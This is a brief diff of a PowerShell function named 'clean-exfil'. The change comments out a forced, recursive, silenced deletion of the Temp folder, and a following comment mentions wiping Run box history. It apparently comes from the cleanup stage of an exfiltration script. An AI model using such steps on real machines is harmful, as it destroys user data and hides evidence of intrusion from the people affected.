@@ -293,7 +293,7 @@ function clean-exfil {
 try {
 # Delete contents of Temp folder 
 
-	rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+#	rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
 
